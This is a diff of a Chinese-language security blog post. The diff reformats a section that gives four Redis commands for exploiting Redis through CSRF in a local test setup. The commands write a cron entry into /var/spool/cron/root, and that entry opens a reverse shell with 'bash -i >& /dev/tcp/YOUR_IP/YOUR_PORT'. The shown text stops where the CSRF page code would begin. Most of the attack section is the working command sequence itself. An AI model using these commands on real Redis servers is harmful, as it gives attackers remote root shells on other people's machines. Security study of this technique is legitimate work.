@@ -29,14 +29,30 @@ share: true
 ### 攻击利用
 
 在本地搭建的测试环境中，我们尝试利用Redis CSRF写入cron配置脚本，从而获取目标主机的反弹shell。从redis原始操作命令来看，需要4步程序：
-* 设置路径:
-`config set dir /var/spool/cron/`
-* 设置文件名：
- `config set dbfilename root`
-* 将cron脚本写入key:
-`set wow "\n\n\n* * * * * bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1\n\n\n"`
-* 利用save命令写入系统目录:
-`SAVE`
+
+1. 设置路径:
+
+{% highlight %}
+config set dir /var/spool/cron/
+{% endhighlight %}
+
+2. 设置文件名：
+
+{% highlight %}
+ config set dbfilename root
+{% endhighlight %}
+
+3. 将cron脚本写入key:
+
+{% highlight %}
+set wow "\n\n\n* * * * * bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1\n\n\n"
+{% endhighlight %}
+
+4. 利用save命令写入系统目录:
+
+{% highlight %}
+SAVE
+{% endhighlight %}
 
 将这些命令编码，并构造成CSRF攻击页面，具体代码如下：
 
